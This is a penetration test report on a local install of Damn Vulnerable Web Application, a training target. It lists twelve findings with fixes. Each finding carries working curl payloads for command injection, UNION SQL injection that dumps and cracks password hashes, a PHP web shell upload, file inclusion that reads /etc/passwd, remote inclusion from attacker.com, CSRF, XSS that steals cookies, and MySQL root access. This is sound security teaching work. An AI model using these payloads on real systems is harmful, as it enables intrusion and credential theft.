Damn Vulnerable Web Application — Penetration Test Disclosure Report

OWASP Easy · July 7, 2026

Target: 172.17.0.3 Assessment Date: July 7, 2026 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the target running Damn Vulnerable Web Application (DVWA) v1.10 on Apache 2.4.10 with MySQL 5.5.54 inside a Docker container. The assessment identified 12 security vulnerabilities ranging from Critical to Low severity. Initial access was gained through default credentials (admin/password), after which command injection, SQL injection, unrestricted file upload, and local file inclusion were exploited to achieve unauthenticated remote code execution as www-data. The MySQL database was also accessible externally with root privileges. The containerized environment limited privilege escalation to root on the host, but all DVWA application-layer vulnerabilities were fully exploitable.

4. Detailed Findings

F-01: Default Web Application Credentials

Severity: Critical (CVSSv3: 9.1) Affected Component: POST /login.php

Description: The DVWA web application uses the vendor-default credentials admin:password. These credentials are documented in the application's README.md file and were not changed after deployment. An unauthenticated attacker can gain immediate administrative access to the entire DVWA application, including all vulnerability modules, the database setup page, and the PHP info page.

Steps to Reproduce:

# Obtain CSRF token from login page
TOKEN=$(curl -s -c /tmp/dvwa_cookies.txt http://172.17.0.3/login.php \
  | grep user_token | sed "s/.*value='//" | sed "s/'.*//")

# Login with default credentials
curl -s -b /tmp/dvwa_cookies.txt -c /tmp/dvwa_cookies.txt -L \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  http://172.17.0.3/login.php

Impact: Full administrative access to the DVWA application, enabling an attacker to exploit all built-in vulnerabilities and gain remote code execution.

Recommendation: Change all default credentials immediately. Enforce password complexity requirements during setup.

F-02: Command Injection Leading to Remote Code Execution

Severity: Critical (CVSSv3: 9.8) Affected Component: POST /vulnerabilities/exec/ — parameter ip

Description: The "Command Injection" module executes a system ping command by concatenating user-supplied input directly into a shell command. No input sanitization or validation is performed. An attacker can inject arbitrary shell commands using command separators (;, |, &&), achieving full remote code execution as the www-data user.

Source Code:

$target = $_REQUEST[ 'ip' ];
$cmd = shell_exec( 'ping -c 4 ' . $target );

Steps to Reproduce:

curl -s -b /tmp/dvwa_cookies.txt \
  -d "ip=127.0.0.1%3Bid&Submit=Submit" \
  http://172.17.0.3/vulnerabilities/exec/

# Response includes:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

Impact: Complete remote code execution as the www-data user. Attacker can read files, execute commands, and pivot to internal services.

Recommendation: Never pass user input directly to shell functions. Use filter functions to validate IP address format (e.g., filter_var($target, FILTER_VALIDATE_IP)). Avoid shell_exec(), exec(), and system() with user-controlled input.

F-03: SQL Injection (UNION-based)

Severity: Critical (CVSSv3: 9.1) Affected Component: POST /vulnerabilities/sqli/ — parameter id

Description: The SQL Injection vulnerability module directly interpolates user input into a SQL query without parameterization or sanitization. An attacker can extract arbitrary data from the database using UNION-based SQL injection.

Source Code:

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

Steps to Reproduce:

# Extract all user credentials
curl -s -b /tmp/dvwa_cookies.txt \
  -d "id=1'+union+select+user,password+from+users--+&Submit=Submit" \
  http://172.17.0.3/vulnerabilities/sqli/

# Results:
# admin:5f4dcc3b5aa765d61d8327deb882cf99
# gordonb:e99a18c428cb38d5f260853678922e03
# 1337:8d3533d75ae2c3966d7e0d4fcc69216b
# pablo:0d107d09f5bbe40cade3de5c71e9e9b7
# smithy:5f4dcc3b5aa765d61d8327deb882cf99

Cracked passwords:

  • admin:password
  • gordonb:abc123
  • 1337:charley
  • pablo:letmein
  • smithy:password

Impact: Complete disclosure of all user credentials stored in the database, including password hashes that are trivially cracked (MD5, unsalted).

Recommendation: Use prepared statements with parameterized queries. Implement proper input validation and least-privilege database accounts.

F-04: Unrestricted File Upload

Severity: High (CVSSv3: 8.8) Affected Component: POST /vulnerabilities/upload/

Description: The file upload module performs no validation on uploaded file types. Any file extension (including .php, .phtml, .php5) can be uploaded. This allows an attacker to upload a malicious PHP web shell and access it directly in the web root, achieving remote code execution.

Source Code:

$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path );

Steps to Reproduce:

# Create web shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php

# Upload
curl -s -b /tmp/dvwa_cookies.txt \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@/tmp/cmd.php;type=application/x-php" \
  -F "Upload=Upload" \
  http://172.17.0.3/vulnerabilities/upload/

# Execute commands
curl -s "http://172.17.0.3/hackable/uploads/cmd.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

Impact: Remote code execution as www-data through arbitrary PHP file upload.

Recommendation: Validate file extensions against an allowlist. Check MIME types. Disable execution permissions on the uploads directory.

F-05: Local & Remote File Inclusion

Severity: High (CVSSv3: 8.6) Affected Component: GET /vulnerabilities/fi/?page= — parameter page

Description: The file inclusion module passes the page parameter directly to PHP's include() function with no filtering. Because allow_url_include is enabled in the PHP configuration, both Local File Inclusion (LFI) and Remote File Inclusion (RFI) are possible. An attacker can read arbitrary local files or include remote files containing malicious PHP code.

Source Code:

$file = $_GET[ 'page' ];
// ... (no sanitization before include)

Steps to Reproduce:

# LFI — read /etc/passwd
curl -s -b /tmp/dvwa_cookies.txt \
  "http://172.17.0.3/vulnerabilities/fi/?page=/etc/passwd"

# RFI — include remote PHP shell (exploitable via hosted payload)
curl -s -b /tmp/dvwa_cookies.txt \
  "http://172.17.0.3/vulnerabilities/fi/?page=http://attacker.com/shell.txt"

Impact: Arbitrary file read (LFI) and remote code execution (RFI). An attacker can read sensitive system files or execute code hosted on an external server.

Recommendation: Implement a whitelist of allowed include files. Disable allow_url_include in php.ini. Use a mapping array rather than direct user input for file inclusion.

F-06: Cross-Site Request Forgery (Password Change)

Severity: High (CVSSv3: 8.0) Affected Component: GET /vulnerabilities/csrf/ — parameters password_new, password_conf

Description: The password change functionality accepts GET requests and does not implement any CSRF token validation. An attacker can craft a malicious link or combine with XSS to force an authenticated user's password to be changed without their consent.

Steps to Reproduce:

# Change password via GET (no CSRF token required)
curl -s -b /tmp/dvwa_cookies.txt \
  -G --data-urlencode 'password_new=hacked123' \
  --data-urlencode 'password_conf=hacked123' \
  --data-urlencode 'Change=Change' \
  http://172.17.0.3/vulnerabilities/csrf/

# Response: "Password Changed."

Impact: An attacker can change any authenticated user's password by tricking them into visiting a crafted URL or combining with the XSS vulnerability.

Recommendation: Use POST method only. Implement CSRF tokens for all state-changing operations. Use SameSite cookie attributes.

F-07: MySQL Root Access from Any Host

Severity: High (CVSSv3: 7.5) Affected Component: MySQL on port 3306

Description: The MySQL database grants root access from any host (root@%) with a weak password (p@ssw0rd). The MySQL service is exposed on port 3306 to the network. After flushing the host cache, an attacker can connect directly from an external machine.

Steps to Reproduce:

# From inside (unblock host cache)
mysql -u root -pp@ssw0rd -e "FLUSH HOSTS;"

# From external Kali
mysql -h 172.17.0.3 -u root -pp@ssw0rd --skip-ssl \
  -e "SELECT user,host,password FROM mysql.user;"

Impact: Full read/write access to all databases. An attacker can extract, modify, or destroy all application data.

Recommendation: Restrict MySQL user grants to specific hosts only. Use strong passwords. Remove wildcard host entries (%). Consider disabling remote MySQL access entirely.

F-08: Sensitive Information Disclosure — Directory Listings

Severity: Medium (CVSSv3: 5.3) Affected Component: /config/, /docs/, /external/

Description: Apache directory listing is enabled, exposing several directories that leak sensitive information:

  • /config/ — Exposes config.inc.php containing MySQL credentials (root:p@ssw0rd)
  • /docs/ — Exposes DVWA_v1.3.pdf documentation
  • /external/ — Exposes phpids and recaptcha subdirectories

Steps to Reproduce:

curl -s "http://172.17.0.3/config/"
# Lists config.inc.php — attempt to fetch reveals PHP source not executed
# (file was protected from direct PHP execution in this instance)

Impact: Attackers can discover sensitive files and credentials, aiding further exploitation.

Recommendation: Disable directory listing in Apache configuration (Options -Indexes). Move configuration files outside the web root.

F-09: Reflected Cross-Site Scripting (XSS)

Severity: Medium (CVSSv3: 6.1) Affected Component: GET /vulnerabilities/xss_r/ — parameter name

Description: The reflected XSS module directly echoes user input without sanitization or encoding. An attacker can inject arbitrary JavaScript that executes in the context of the victim's browser.

Source Code:

$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';

Steps to Reproduce:

curl -s -b /tmp/dvwa_cookies.txt \
  -G --data-urlencode 'name=<script>alert(1)</script>' \
  --data-urlencode 'Submit=Submit' \
  http://172.17.0.3/vulnerabilities/xss_r/

# Response: Hello <script>alert(1)</script>

Impact: Session theft, phishing, or further client-side attacks in the context of the authenticated user's session.

Recommendation: Encode all user-supplied data with htmlspecialchars() or equivalent before output.

F-10: Stored Cross-Site Scripting (XSS)

Severity: Medium (CVSSv3: 6.1) Affected Component: POST /vulnerabilities/xss_s/

Description: The stored XSS module (guestbook) stores user input in the database and displays it to all visitors without HTML encoding. While the input is sanitized with mysql_real_escape_string() to prevent SQL injection, no output encoding is performed. The name field accepts JavaScript payloads that execute for every visitor to the guestbook.

Steps to Reproduce:

curl -s -b /tmp/dvwa_cookies.txt \
  -d "txtName=<script>alert(document.cookie)</script>&mtxMessage=Hello&btnSign=Sign+Guestbook" \
  http://172.17.0.3/vulnerabilities/xss_s/

Impact: Persistent JavaScript execution affecting all users who view the guestbook page, enabling session theft, defacement, or malware delivery.

Recommendation: Apply HTML entity encoding (htmlspecialchars()) to all user-supplied data before rendering. Implement Content Security Policy (CSP) headers.

F-11: Brute Force Login Endpoint

Severity: Medium (CVSSv3: 5.3) Affected Component: GET /vulnerabilities/brute/

Description: The brute force module uses GET parameters for authentication with no rate limiting, account lockout, or CSRF protection. The backend is also vulnerable to SQL injection in the username/password fields, allowing authentication bypass without valid credentials.

Source Code:

$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

Impact: An attacker can bypass authentication entirely via SQL injection or brute-force credentials without restriction.

Recommendation: Implement rate limiting, account lockout, and use parameterized queries. Switch to POST method with CSRF protection.

F-12: Weak Password Hashing (MD5, Unsalted)

Severity: Medium (CVSSv3: 5.3) Affected Component: Application user database

Description: User passwords are stored as unsalted MD5 hashes (via PHP's md5() function). All five user passwords were cracked instantly against common password lists. MD5 is a fast, non-cryptographic hash that provides no protection against offline cracking.

Steps to Reproduce:

# Extracted via SQL injection:
admin:5f4dcc3b5aa765d61d8327deb882cf99   -> "password"
gordonb:e99a18c428cb38d5f260853678922e03 -> "abc123"
1337:8d3533d75ae2c3966d7e0d4fcc69216b    -> "charley"
pablo:0d107d09f5bbe40cade3de5c71e9e9b7   -> "letmein"
smithy:5f4dcc3b5aa765d61d8327deb882cf99   -> "password"

Impact: Offline brute-force attacks can recover all user passwords rapidly. Cracked credentials can be used for application login.

Recommendation: Use bcrypt, Argon2, or PBKDF2 for password hashing with a unique salt per user. Password hashes should never use md5().
